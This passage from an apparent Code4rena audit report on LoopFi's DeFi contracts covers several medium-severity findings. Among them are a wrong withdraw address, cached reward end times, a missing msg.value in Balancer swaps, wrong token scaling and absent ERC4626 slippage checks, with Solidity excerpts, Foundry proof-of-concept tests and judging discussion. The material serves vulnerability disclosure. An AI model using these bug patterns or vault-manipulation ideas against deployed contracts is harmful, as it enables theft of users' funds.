>         uint256 amountOutMin = (depositAmount * 1e12 * 98) / 100; // convert 6 decimals to 18 and add 1% slippage
> 
>         deal(address(USDC), user, depositAmount);
> 
>         // build increase collateral params
>         bytes32[] memory poolIds = new bytes32[](1);
>         poolIds[0] = stablePoolId;
> 
>         address[] memory assets = new address[](2);
>         assets[0] = address(USDC);
>         assets[1] = address(token);
> 
>         // Change 2: Change targetToken to `token`, since the vault's collateral token is `token`. (The previous UT `test_deposit_vault_with_entry_swap_from_USDC` marked this as `USDC`, which is incorrect ).
>         CollateralParams memory collateralParams = CollateralParams({
>             targetToken: address(token),
>             amount: 0, // not used for swaps
>             collateralizer: address(user),
>             auxSwap: SwapParams({
>                 swapProtocol: SwapProtocol.BALANCER,
>                 swapType: SwapType.EXACT_IN,
>                 assetIn: address(USDC),
>                 amount: depositAmount, // amount to swap in
>                 limit: amountOutMin, // min amount of collateral token to receive
>                 recipient: address(userProxy),
>                 deadline: block.timestamp + 100,
>                 args: abi.encode(poolIds, assets)
>             })
>         });
> 
>         uint256 expectedCollateral = _simulateBalancerSwap(collateralParams.auxSwap);
> 
>         vm.prank(user);
>         USDC.approve(address(userProxy), depositAmount);
> 
>         vm.prank(user);
>         userProxy.execute(
>             address(positionAction4626),
>             abi.encodeWithSelector(
>                 positionAction4626.deposit.selector,
>                 address(userProxy),
>                 address(vault),
>                 collateralParams,
>                 emptyPermitParams
>             )
>         );
> 
>         (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(userProxy));
> 
>         assertEq(collateral, expectedCollateral);
>         assertEq(debt, 0);
>     }
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2441898544):**
 > @pkqs90 
> 
> ```sh
> Error (7920): Identifier not found or not unique.
>    --> src/test/integration/PositionAction20.t.sol:861:9:
>     |
> 861 |         PositionAction4626 positionAction4626 = new PositionAction4626(
> ```
> 
> Anything to add here to fix this error? 

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2441941660):**
 > @Koolex - Add this import in the beginning of file:
> 
> ```solidity
> import {PositionAction4626} from "../../proxy/PositionAction4626.sol";
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/85#issuecomment-2442288276):**
 > The function reverts as @pkqs90 stated. 
> 
> ```sh
> [FAIL. Reason: PositionAction__deposit_InvalidAuxSwap()] test_PoC() (gas: 4270979)
> Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 884.18ms (4.20ms CPU time)
> 
> Ran 1 test suite in 887.08ms (884.18ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
> 
> Failing tests:
> Encountered 1 failing test in src/test/integration/PositionAction20.t.sol:PositionAction20Test
> [FAIL. Reason: PositionAction__deposit_InvalidAuxSwap()] test_PoC() (gas: 4270979)
> ```
> 
> ***
> 
> > The most common use case is to swap random input `tokenA` to `targetToken`, and deposit `targetToken` into vault. For this case, if we force `targetToken` to be `inputToken`, the swap doesn't make sense.
> 
> I believe this is a valid concern. Stays as-is. The function doesn't seem to work as intended.

***

## [[M-35] `PositionAction4626.sol#_onWithdraw` should withdraw from `position` CDPVault position instead of `address(this)`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/80) and [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/450)*

In `PositionAction4626`, the `_onWithdraw` should withdraw the token from `position` CDPVault position. However, currently it withdraws from `address(this)`. This is inconsistent to the parent contract `PositionAction.sol`, which specifically states the operation should handle the `position` address.

Also, in contrast, we can check the `PositionAction20` contract, it withdraws from the `position` address.

PositionAction4626.sol:

```solidity
    function _onWithdraw(address vault, address /*position*/, address dst, uint256 amount) internal override returns (uint256) {
>       uint256 collateralWithdrawn = ICDPVault(vault).withdraw(address(this), amount);

        // if collateral is not the dst token, we need to withdraw the underlying from the ERC4626 vault
        address collateral = address(ICDPVault(vault).token());
        if (dst != collateral) {
            collateralWithdrawn = IERC4626(collateral).redeem(collateralWithdrawn, address(this), address(this));
        }

        return collateralWithdrawn;
    }
```

PositionAction20.sol:

```solidity
    function _onWithdraw(address vault, address position, address /*dst*/, uint256 amount) internal override returns (uint256) {
>       return ICDPVault(vault).withdraw(position, amount);
    }
```

PositionAction.sol:

```solidity
    /// @notice Hook to withdraw collateral from CDPVault, handles any CDP specific actions
    /// @param vault The CDP Vault
>   /// @param position The CDP Vault position
    /// @param dst Token the caller expects to receive
    /// @param amount The amount of collateral to deposit [wad]
    /// @return Amount of collateral (or dst) withdrawn [CDPVault.tokenScale()]
    function _onWithdraw(address vault, address position, address dst, uint256 amount) internal virtual returns (uint256);
```

### Recommended Mitigation Steps

```diff
-       uint256 collateralWithdrawn = ICDPVault(vault).withdraw(address(this), amount);
+       uint256 collateralWithdrawn = ICDPVault(vault).withdraw(position, amount);
```

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81#event-14337586316)**

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81#issuecomment-2385458026):**
 > Please elaborate on the impact, will re-evaluate in PJQA.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81#issuecomment-2392810633):**
 > @Koolex - The proxy supports depositing/withdrawing collateral from positions other than the proxy itself. An example can be found in unit tests, where a user creates a position for another address (aliceProxy).
> 
> The issue here is that for PositionAction4626, it only supports actions on the vault of the sender proxy, and not any other address. To make a comparison, both PositionAction20 and PositionActionPendle supports it, only PositionAction4626 lack this functionality.
> 
> ```solidity
>     function test_deposit_to_an_unrelated_position() public {
>         // create 2nd position
>         address alice = vm.addr(0x45674567);
>         PRBProxy aliceProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(alice))));
> 
>         uint256 depositAmount = 10_000 ether;
> 
>         deal(address(token), user, depositAmount);
> 
>         CollateralParams memory collateralParams = CollateralParams({
>             targetToken: address(token),
>             amount: depositAmount,
>             collateralizer: address(user),
>             auxSwap: emptySwap // no entry swap
>         });
> 
>         vm.prank(user);
>         token.approve(address(userProxy), depositAmount);
> 
>         vm.prank(user);
>         userProxy.execute(
>             address(positionAction),
>             abi.encodeWithSelector(
>                 positionAction.deposit.selector,
>                 address(aliceProxy),
>                 address(vault),
>                 collateralParams,
>                 emptyPermitParams
>             )
>         );
> 
>         (uint256 collateral, uint256 debt, , , , ) = vault.positions(address(aliceProxy));
> 
>         assertEq(collateral, depositAmount);
>         assertEq(debt, 0);
>     }
> ```

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/81#issuecomment-2408957255):**
 > Stays as-is.

***

## [[M-36] ChefIncentivesController caches `endRewardTime`, which is not required, and may cause issues during reward update](https://github.com/code-423n4/2024-07-loopfi-findings/issues/75)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/75), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/74), hash ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/109), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/107)), and [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/10)*

When calculating the `endRewardTime`, there is a cache mechanism that caches the result for `endingTime.updateCadence` (in UT it is set to 2 days). However, during this period, if anything changes, the `endRewardTime` would be incorrect. For example:

1. If `rewardsPerSecond` increases, then the real `endRewardTime` would be smaller than the cached `endRewardTime`.
2. If new rewards (LOOP Tokens) are registered, the real `endRewardTime` would be larger than the cached `endRewardTime`.

If the cached `endRewardTime` is smaller than expected, this will cause the rewards to be not distributed for the time period.

If the cached `endRewardTime` is larger than expected, the some pools may receive rewards after when they should, causing less rewards for other pools.

```solidity
    function _updatePool(VaultInfo storage pool, uint256 _totalAllocPoint) internal {
        uint256 timestamp = block.timestamp;
        uint256 endReward = endRewardTime();
        if (endReward <= timestamp) {
            timestamp = endReward;
        }
        if (timestamp <= pool.lastRewardTime) {
            return;
        }

        (uint256 reward, uint256 newAccRewardPerShare) = _newRewards(pool, _totalAllocPoint);
        accountedRewards = accountedRewards + reward;
        pool.accRewardPerShare = pool.accRewardPerShare + newAccRewardPerShare;
        pool.lastRewardTime = timestamp;
    }

    function endRewardTime() public returns (uint256) {
        if (endingTime.lastUpdatedTime + endingTime.updateCadence > block.timestamp) {
>           return endingTime.estimatedTime;
        }

        uint256 unclaimedRewards = availableRewards();
        uint256 extra = 0;
        uint256 length = poolLength();
        for (uint256 i; i < length; ) {
            VaultInfo storage pool = vaultInfo[registeredTokens[i]];

            if (pool.lastRewardTime > lastAllPoolUpdate) {
                extra +=
                    ((pool.lastRewardTime - lastAllPoolUpdate) * pool.allocPoint * rewardsPerSecond) /
                    totalAllocPoint;
            }
            unchecked {
                i++;
            }
        }
        endingTime.lastUpdatedTime = block.timestamp;

        if (rewardsPerSecond == 0) {
            endingTime.estimatedTime = type(uint256).max;
            return type(uint256).max;
        } else {
            uint256 newEndTime = (unclaimedRewards + extra) / rewardsPerSecond + lastAllPoolUpdate;
            endingTime.estimatedTime = newEndTime;
            return newEndTime;
        }
    }
```

### Recommended Mitigation Steps

Always recalculate for `endRewardTime()` and remove the cache. This is acceptable, because the `_updatePool()` function is only called upon user interactions, and not called regularly, so it is not requried to save gas here.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/75#event-14338077483)**

***

## [[M-37] `SwapAction.sol#balancerSwap` does not support native ETH as input token](https://github.com/code-423n4/2024-07-loopfi-findings/issues/70)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/70), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/69), Centaur ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/360), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/329), [3](https://github.com/code-423n4/2024-07-loopfi-findings/issues/279), [4](https://github.com/code-423n4/2024-07-loopfi-findings/issues/255)), and [Sparrow](https://github.com/code-423n4/2024-07-loopfi-findings/issues/254)*

SwapAction is used to swap tokens using Balancer/Uniswap or join/exit a Pendle pool. Pendle accepts native ETH as input token when joining a Pendle pool, and Balancer accepts native ETH during swap.

We can check that the SwapAction contract also supports passing native ETH as input token, because:
1. `swap()` function, which serves as the entry function, is payable;
2. `pendleJoin()` passes `msg.value` along when calling `pendleRouter.addLiquiditySingleToken()`.

However, the issue is that when performing a balancer swap by `balancerVault.batchSwap`, the `msg.value` is not passed along.

<details>

```solidity
    function swap(SwapParams memory swapParams) public payable returns (uint256 retAmount) {
        if (swapParams.swapProtocol == SwapProtocol.BALANCER) {
            (bytes32[] memory poolIds, address[] memory assetPath) = abi.decode(
                swapParams.args,
                (bytes32[], address[])
            );
            retAmount = balancerSwap(
                swapParams.swapType,
                swapParams.assetIn,
                poolIds,
                assetPath,
                swapParams.amount,
                swapParams.limit,
                swapParams.recipient,
                swapParams.deadline
            );
        } else if (swapParams.swapProtocol == SwapProtocol.UNIV3) {
            retAmount = uniV3Swap(
                swapParams.swapType,
                swapParams.assetIn,
                swapParams.amount,
                swapParams.limit,
                swapParams.recipient,
                swapParams.deadline,
                swapParams.args
            );
        } else if (swapParams.swapProtocol == SwapProtocol.PENDLE_IN) {
            retAmount = pendleJoin(swapParams.recipient, swapParams.limit, swapParams.args);
        } else if (swapParams.swapProtocol == SwapProtocol.PENDLE_OUT) {
            retAmount = pendleExit(swapParams.recipient, swapParams.amount, swapParams.args);
        } else revert SwapAction__swap_notSupported();
        // Transfer any remaining tokens to the recipient
        if (swapParams.swapType == SwapType.EXACT_OUT && swapParams.recipient != address(this)) {
            IERC20(swapParams.assetIn).safeTransfer(swapParams.recipient, swapParams.limit - retAmount);
        }
    }

    function balancerSwap(
        SwapType swapType,
        address assetIn,
        bytes32[] memory poolIds,
        address[] memory assets,
        uint256 amount,
        uint256 limit,
        address recipient,
        uint256 deadline
    ) internal returns (uint256) {
        ...
        return
            abs(
                // @auditnote: BUG. Does not pass msg.value.
@>              balancerVault.batchSwap(
                    kind,
                    swaps,
                    assets,
                    FundManagement({
                        sender: address(this),
                        fromInternalBalance: false,
                        recipient: payable(recipient),
                        toInternalBalance: false
                    }),
                    limits,
                    deadline
                )[pathLength]
            );
    }

    function pendleJoin(address recipient, uint256 minOut, bytes memory data) internal returns (uint256 netLpOut){
        (
            address market,
            ApproxParams memory guessPtReceivedFromSy,
            TokenInput memory input,
            LimitOrderData memory limit
        ) = abi.decode(data, (address, ApproxParams, TokenInput , LimitOrderData));
        
        if (input.tokenIn != address(0)) {
                input.netTokenIn = IERC20(input.tokenIn).balanceOf(address(this));
                IERC20(input.tokenIn).forceApprove(address(pendleRouter),input.netTokenIn);
            }

        (netLpOut,,) = pendleRouter.addLiquiditySingleToken{value: msg.value}(recipient, market, minOut, guessPtReceivedFromSy, input, limit);
    }
```

</details>

### Recommended Mitigation Steps

```diff
-              balancerVault.batchSwap(
+              balancerVault.batchSwap{value: msg:value}(
```

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/70#event-14328470492)**

***

## [[M-38] `PositionAction20._onWithdraw` and `PositionPendle20._onWithdraw` also returns token amount in wrong scale](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42)
*Submitted by [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/576)*

Withdraw operations will invariably revert due to insufficient funds if the collateral's decimal deviates from 18.

### Proof-of-Concept

`CDPVault.withdraw` accepts amount in `tokenScale` but returns token amount in `wad` scale.

See [`CDPVault.withdraw`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L239-L249)

```solidity
function withdraw(address to, uint256 amount) external whenNotPaused returns (uint256 tokenAmount) {
    tokenAmount = wdiv(amount, tokenScale);
    int256 deltaCollateral = -toInt256(tokenAmount);
    modifyCollateralAndDebt({
        owner: to,
        collateralizer: msg.sender,
        creditor: msg.sender,
        deltaCollateral: deltaCollateral,
        deltaDebt: 0
    });
}
```

However, the `PositionAction20._onWithdraw` and `PositionActionPendle._onWithdraw` functions expect a return value scaled to the collateral's decimal, as they use this value to transfer the token back to the collateralizer.

See [`PositionAction20._onWithdraw`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction20.sol#L50-L52) and [`PositionActionPendle._onWithdraw`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionActionPendle.sol#L45-L47)

```solidity
File: /src/proxy/PositionAction20.sol
function _onWithdraw(address vault, address position, address /*dst*/, uint256 amount) internal override returns (uint256) {
    return ICDPVault(vault).withdraw(position, amount); <-- return in wad scale
}

File: /src/proxy/PositionActionPendle.sol
function _onWithdraw(address vault, address position, address /*dst*/, uint256 amount) internal override returns (uint256) {
    return ICDPVault(vault).withdraw(address(position), amount); <-- return in wad scale
}

File: /src/proxy/PositionAction.sol
function _withdraw(address vault, address position, CollateralParams calldata collateralParams) internal returns (uint256) {
    uint256 collateral = _onWithdraw(vault, position, collateralParams.targetToken, collateralParams.amount);
    |-- the below operation will fail because it uses collateral amount in wrong scale
    v
    // perform swap from collateral to arbitrary token
    if (collateralParams.auxSwap.assetIn != address(0)) {
        _delegateCall(
            address(swapAction),
            abi.encodeWithSelector(swapAction.swap.selector, collateralParams.auxSwap)
        );
    } else {
        // otherwise just send the collateral to `collateralizer`
        IERC20(collateralParams.targetToken).safeTransfer(collateralParams.collateralizer, collateral);
    }
    return collateral;
}
```

The problem arises when collateral's decimal is not 18 (wad). For instance, let's say the collateral's decimal is 8:

- Users want to withdraw `1e8` tokens, users must call withdraw function with `amount=1e8`.
- `CDPVault.withdraw` transfer `1e8` tokens back but it returns token amount in wad, `1e18`.
- `_withdraw` will attempt to transfer `1e18` tokens which is much greater than `1e8`; therefore, the execution revert due to insufficient funds.

### Additional Notes

I want to emphasize that although this issue is similar to [WP-M2](https://notes.watchpug.com/p/190dd9d39acrEJAv#n\_3), it is not the same finding as it happens in a different code path.

### Recommended Mitigations

Convert return amount to token scale first before returning value.

```

    function _onWithdraw(address vault, address position, address /*dst*/, uint256 amount) internal override returns (uint256) {
        uint wadAmount = ICDPVault(vault).withdraw(address(position), amount);
        
        return wmul(wadAmount, ICDPVault(vault).tokenScale());
    }
```

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42#event-14320381834)**

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42#issuecomment-2385391404):**
 > Looks like the same issue as [WP-M2](https://notes.watchpug.com/p/190dd9d39acrEJAv#n_3). If it is not the same, please point out the diff - will re-evaluate in PJQA.

**[nnez (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42#issuecomment-2392822576):**
 > @Koolex - To answer your question, [WP-M2](https://notes.watchpug.com/p/190dd9d39acrEJAv#n_8) specifically mentions `PositionAction4626._onWithdraw()` and does not include `PositionAction20` and `PositionActionPendle`.  
> 
> Therefore, we cannot assume that it is a known issue, as it exists in different contracts.  

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/42#issuecomment-2408930260):**
 > Stays as-is.

***

## [[M-39] Lack of slippage check while interacting with ERC4626 Vault in `PositionAction4626` could lead to users' fund loss](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38)
*Submitted by [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38)*

Users' funds loss from ERC4626 exchange rate change or manipulated.

### Proof of Concept

If users specify `collateralParams.targetToken` as ERC4626's underlying token, `PositionAction4626` will attempt to deposit the `targetToken` to ERC4626 vault in order to retrieve the collateral token corresponding to the CDP Vault.

The execution flow:

See [`PositionAction._deposit`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol#L502-L527)

```
    PositionAction.deposit --> PositionAction._deposit --> PositionAction4626._onDeposit
```

Here is the implementation used to convert from ERC4626's underlying to ERC4626 token:

See [`PositionAction4626._onDeposit`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction4626.sol#L41-L53)

```
    function _onDeposit(address vault, address /*position*/, address src, uint256 amount) internal override returns (uint256) {
        address collateral = address(ICDPVault(vault).token());

        // if the src is not the collateralToken, we need to deposit the underlying into the ERC4626 vault
        if (src != collateral) {
            address underlying = IERC4626(collateral).asset();
            IERC20(underlying).forceApprove(collateral, amount);
            amount = IERC4626(collateral).deposit(amount, address(this)); <-- No slippage check
        }

        IERC20(collateral).forceApprove(vault, amount);
        return ICDPVault(vault).deposit(address(this), amount);
    }
```

In this implementation, there is no slippage check when performing a deposit on target ERC4626's vault. This could leads to users' fund loss from slippage as ERC4626's exchange rate can change or be manipulated while users' transaction is pending.

This also happens in `withdraw` execution flow:

```
    PositionAction.withdraw --> PositionAction._withdraw --> PositionAction4626._onWithdraw  
```

If users specify a different `dst` (destination) token, it attempts to redeem that token from ERC4626 vault.

```
    function _onWithdraw(address vault, address /*position*/, address dst, uint256 amount) internal override returns (uint256) {
        uint256 collateralWithdrawn = ICDPVault(vault).withdraw(address(this), amount);

        // if collateral is not the dst token, we need to withdraw the underlying from the ERC4626 vault
        address collateral = address(ICDPVault(vault).token());
        if (dst != collateral) {
            collateralWithdrawn = IERC4626(collateral).redeem(collateralWithdrawn, address(this), address(this)); <-- No slippage check
        }

        return collateralWithdrawn;
    }
```

### Recommended Mitigations

Allow users to specify their slippage tolerance when interacting with `PositionAction4626`.

### References

[EIPS](https://eips.ethereum.org/EIPS/eip-4626#security-considerations)

### Assessed type

ERC4626

**[amarcu (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2360459954):**
 > Adding the splippage check will help but the funds are not directly at risk and cannot be stolen. We suggest this issue be a medium and not a high.

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2371303360)**

**[Infect3d (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2389647697):**
 > As said by the sponsor, the funds are not at risk. I cannot think a case where slippage when depositing/withdrawing in a 4626 vault could cause a loss of fund. User depositing in a Vault simply get shares representing how much of the total vault he deposited.
 >
> If he redeem, he will get back his assets, or more if vault yielded in between. All issues about slippage when depositing/withdrawing from a 4626 vaults are invalid.

**[nnez (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2392849459):**
 > Firstly, sponsors said that funds are not **directly** at risk. That doesn't mean there are no funds at risk. There is always some degree of slippage loss when depositing or minting in an ERC4626 vault, and this loss is directly tied to the ERC4626 exchange rate.  
> 
> As noted in [OpenZeppelin's documentation](https://docs.openzeppelin.com/contracts/4.x/erc4626#the_attack), the exchange rate can fluctuate, leading to discrepancies between the amount deposited and the corresponding shares received. A log-scale graph of this relationship highlights that the shares received may not accurately reflect the deposited amount due to these exchange rate changes.  
> 
> ERC4626 is inherently prone to this issue because it was designed to be called by smart contract account not by EOA. It assumes that any integrating smart contract will implement slippage protection, ensuring that the shares received can be redeemed within an allowed slippage range. Without such protection, EOAs are more vulnerable to losses from exchange rate fluctuations. This concern is further discussed in detail by the Ethereum Magicians community in their proposal for [EIP-5143 (Slippage Protection for Tokenized Vaults)](https://ethereum-magicians.org/t/eip-5143-slippage-protection-for-tokenized-vaults/9554/2).  
> 
> Additionally, Zellic’s analysis of ERC4626 vaults highlights the risks for EOAs when interacting directly with these vaults, specifically mentioning that “what you give is not necessarily what you get” due to slippage and exchange rate variability ([source 1](https://www.zellic.io/blog/exploring-erc-4626/#eoa-direct-access), [source 2](https://www.zellic.io/blog/exploring-erc-4626/#what-you-give-is-not-necessarily-what-you-get)).  
> 
> The ERC4626 standard contract of OZ acknowledges slippage concerns, as shown in the comments [IERC4626 interface](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC4626.sol#L93-L94).  
> 
> Moreover, the audit information do not specify which ERC4626 vault will be integrated. As a result, we must assume the contract should be compatible with any vault adhering to the ERC4626 standard, including those susceptible to exchange rate manipulation. Without slippage protection in place, slippage losses could be as high as 100%. ([exchange rate manipulation in ERC4626 vaults](https://www.euler.finance/blog/exchange-rate-manipulation-in-erc4626-vaults)).  
> 
> Technical aside, if slippage during interactions with ERC4626 vaults were not a significant issue, it wouldn’t be such a widely discussed topic. The prevalence of discussions around slippage highlights the importance of addressing this concern.  

**[Infect3d (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2394409899):**
 > @nnez - The OZ source discuss about rounding error, here's what they say: 
> > This rounding is often negligible because of the amount at stake. If you deposit 1e9 shares worth of tokens, the rounding will have you lose at most 0.0000001% of your deposit. However if you deposit 10 shares worth of tokens, you could lose 10% of your deposit
> Tokens have at least 6 decimals, so the rounding error is at most 0.0001%, which is negligible.
> 
> The Zellic source is referring to "slippage" due to:
> 1. Rounding error, we already shown that this is negligible, unless the exchange rate are so high and close to the token decimals that it is not considered dust. 
> 2. Vault deposit/withdraw fees. But vault fees are known in advance so user should be able to carefully select the values he will input when calling the vault functions to take into account the fees.
> 
> Zellic examples doesn't seems to relate with what is referred as slippage in the submissions: they discuss about the difference of asset taken from user them when he calls `mint`, and asset given to user them when he calls `redeem`.
> > The amount of underlying assets a user may receive through redeeming their shares in the vault (`previewRedeem`) can be significantly different than the amount that would be taken from them when minting the same quantity of shares (`previewMint`). The differences may be small (e.g., if due to rounding error) or significant (e.g., if a vault implements withdrawal or deposit fees)
> 
> In those conditions don't see how adding a slippage parameter will prevent this, if we consider user is aware of the fees, and of the exchange rate ?
> If the Vault sees his assets increasing due to yield before user "redeem" tx is executed, then he will get more asset than expected before the yield. Same logic can apply for deposit, if vault yielded, he will have at least a better position.
> 
> About the exchange rate manipulation in Euler article, all of these manipulation goals are to increase the exchange rate by sending assets into the vault without minting the expected number of equivalent shares (the idea being to increase share price and use the inflated shares to borrow in another protocol, and the attack is usually executed in 1 tx.
> 
> Also, an increased exchange rate would be beneficial for someone withdrawing from the vault, as his shares would allow him to withdraw more assets.
> 
> To finish, I agree there are situations where a harmful slippage could occur:
> 1. When the vault incur a loss right before user tx is executed (how ?);
> 2. If user is subject to first depositor attack.
> 
> But in my opinion, 1 shouldn't occur in a vault meant to generate yield and 2 too, as far as the vault implement recent ERC4626 contracts or follows well known practices to avoid it.

**[nnez (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2394987952):**
 > No problem @Infect3d. My answer was also long and I do appreciate you taking the time and sorry if you find some of the examples not quite relevant.   
> 
> However, your answer actually sent me into the rabbit hole, searching for my answer on the topic.   
> 1. The exchange rate of ERC4626 vault depends on how the vault utilize its assets (its strategy), the yield-bearing notion doesn’t necessitate that the exchange rate is an ever-growing rate. 
> 
> The example is actually the StakingLPEth contract itself. When the protocol implements a mechanism to distribute loss from bad debt among shareholders ([#186](https://github.com/code-423n4/2024-07-loopfi-findings/issues/186)), this can be a great example to answer your question.
>> “A liquidation transaction that realizes the bad debt for the vault is executed before users’ withdrawal transaction”.
>
> This can be problematic as users might want to exit as fast as possible before the loss is realized but if they fail to do so they might want to hold on to those shares and decide not to realize the loss right away (as they can choose wait for the interest rate or protocol reserve to catch up). A slippage protection mechanism can definitely help with this situation.  
> 
> 2. I agree that the first depositor attack should practically be mitigated if the vault owner follows a proper security practice.
>
> However, we’re dealing with a generic ERC4626 here as the audit information doesn’t specify which vault is going to be integrate into the protocol. An integrating vault might not use OZ ERC4626 as the base contract and the mitigating mechanism (which ERC4626 also doesn’t dictate this) might not be there.  
> 
> In conclusion,
> 
> 1. Can happen under certain situations and it can cause unexpected loss.
> 2. Can happen but the likelihood depends on how you view the burden of implementing mitigation of the integrating vault as the standard doesn’t dictate it. I found this while I was digging around the topic: 
> - https://forum.openzeppelin.com/t/erc4626-inflation-attack-discussion/41643/9
> - https://github.com/OpenZeppelin/openzeppelin-contracts/issues/5223
> 
> It seems like `_decimalsOffset` might not be effective against inflation attack on an empty vault in some cases

**[Infect3d (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2395473835):**
 > @nnez, thank you again, really appreciated these insightful information you provided.
> 1. You are right here, forgot that PoolV3 had that peculiarity (all these escalations I've created come from notes I've taken `~` 2 months ago). 
> 2. Very interesting situation here, risky but well thought. Never seen this used until today, thanks for sharing.
> I don't have much to add to this conversation, what you say make sense.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/38#issuecomment-2440186439):**
 > Thanks everyone. This stays as-is.

***

# Low Risk and Non-Critical Issues

For this audit, 23 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-07-loopfi-findings/issues/540) by **Bauchibred** received the top score from the judge.

*The following wardens also submitted reports: [Rhaydden](https://github.com/code-423n4/2024-07-loopfi-findings/issues/532), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/90), [K42](https://github.com/code-423n4/2024-07-loopfi-findings/issues/544), [inh3l](https://github.com/code-423n4/2024-07-loopfi-findings/issues/537), [0xhacksmithh](https://github.com/code-423n4/2024-07-loopfi-findings/issues/535), [Afriauditor](https://github.com/code-423n4/2024-07-loopfi-findings/issues/529), [Trooper](https://github.com/code-423n4/2024-07-loopfi-findings/issues/547), [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/546), [Agontuk](https://github.com/code-423n4/2024-07-loopfi-findings/issues/545), [atoko](https://github.com/code-423n4/2024-07-loopfi-findings/issues/542), [peanuts](https://github.com/code-423n4/2024-07-loopfi-findings/issues/541), [minglei-wang-3570](https://github.com/code-423n4/2024-07-loopfi-findings/issues/533), [Sparrow](https://github.com/code-423n4/2024-07-loopfi-findings/issues/531), [Kaysoft](https://github.com/code-423n4/2024-07-loopfi-findings/issues/233), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/232), [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/185), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/153), [Centaur](https://github.com/code-423n4/2024-07-loopfi-findings/issues/148), [jo13](https://github.com/code-423n4/2024-07-loopfi-findings/issues/147), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/119), [ustas](https://github.com/code-423n4/2024-07-loopfi-findings/issues/35), and [novamanbg](https://github.com/code-423n4/2024-07-loopfi-findings/issues/18).*

## Disclaimer

As per the guidelines in the [README](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/README.md#L23), fresh findings related to the previous audits are OOS, which is why they've been seperated. To facilitate easier navigation, this report includes two separate tables:

1. Contents of the Low/NC reports.
2. Notes on Watchpug's audit findings `(C/H/M)`.

Please refer to the appropriate table to ease navigation for either of the sections

## Table of Contents for Low/NC

| Issue ID | Description |
| --- | ----------- |
| [01] | `ChefIncentivesController#batchUpdateAllocPoint()` `ChefIncentivesController#_massUpdatePools()` would be broken when protocol heavily scales |
| [02] | Make `repay()` and liquidations available in the same scenario |
| [03] | Consider allowing price updates within the wait window if the price has moved beyond a certain threshold |
| [04] | Consider having a safety buffer applied to liquidations |
| [05] | Potential mis-pricing when a token gets removed/deregistered from a Balancer pool |
| [06] | Users can sidestep the `cooldownDuration` in an edge case |
| [07] | Consider not relying on an infrequently updated oracle for AURA spot pricing |
| [08] | Fallback oracles should be implemented in the `CDPVault` |
| [09] | Configuration changes could drastically affect users and should be behind a timelock |
| [10] | Using spot prices directly for liquidations might be unfair for users and leaves them at risk |
